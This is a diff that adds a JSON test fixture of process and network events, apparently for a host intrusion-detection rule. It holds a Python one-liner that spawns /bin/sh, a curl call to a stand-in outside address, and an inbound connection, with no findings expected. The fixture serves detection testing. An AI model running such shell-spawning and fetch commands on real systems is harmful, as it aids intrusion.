@@ -1,0 +1,102 @@
+{
+  "events": [
+    {
+      "event_id": "snc-py-fork",
+      "host_id": "fixture-host",
+      "timestamp_ns": 1000000000,
+      "event_type": "fork",
+      "payload": {
+        "child_pid": 6001,
+        "parent_pid": 1
+      }
+    },
+    {
+      "event_id": "snc-py-exec",
+      "host_id": "fixture-host",
+      "timestamp_ns": 1010000000,
+      "event_type": "exec",
+      "payload": {
+        "pid": 6001,
+        "ppid": 1,
+        "path": "/usr/bin/python3",
+        "args": [
+          "python3",
+          "-c",
+          "import subprocess; subprocess.run(['/bin/sh'])"
+        ],
+        "cwd": "/tmp",
+        "uid": 501,
+        "gid": 20
+      }
+    },
+    {
+      "event_id": "snc-sh-fork",
+      "host_id": "fixture-host",
+      "timestamp_ns": 1050000000,
+      "event_type": "fork",
+      "payload": {
+        "child_pid": 6002,
+        "parent_pid": 6001
+      }
+    },
+    {
+      "event_id": "snc-sh-exec",
+      "host_id": "fixture-host",
+      "timestamp_ns": 1060000000,
+      "event_type": "exec",
+      "payload": {
+        "pid": 6002,
+        "ppid": 6001,
+        "path": "/bin/sh",
+        "args": [
+          "sh"
+        ],
+        "cwd": "/tmp",
+        "uid": 501,
+        "gid": 20
+      }
+    },
+    {
+      "event_id": "snc-curl-fork",
+      "host_id": "fixture-host",
+      "timestamp_ns": 1100000000,
+      "event_type": "fork",
+      "payload": {
+        "child_pid": 6003,
+        "parent_pid": 6002
+      }
+    },
+    {
+      "event_id": "snc-curl-exec",
+      "host_id": "fixture-host",
+      "timestamp_ns": 1110000000,
+      "event_type": "exec",
+      "payload": {
+        "pid": 6003,
+        "ppid": 6002,
+        "path": "/usr/bin/curl",
+        "args": [
+          "curl",
+          "https://198.51.100.7/x"
+        ],
+        "cwd": "/tmp",
+        "uid": 501,
+        "gid": 20
+      }
+    },
+    {
+      "event_id": "snc-inbound",
+      "host_id": "fixture-host",
+      "timestamp_ns": 1120000000,
+      "event_type": "network_connect",
+      "payload": {
+        "pid": 6003,
+        "protocol": "tcp",
+        "direction": "inbound",
+        "remote_address": "198.51.100.7",
+        "remote_port": 443
+      }
+    }
+  ],
+  "expected_findings": []
+}
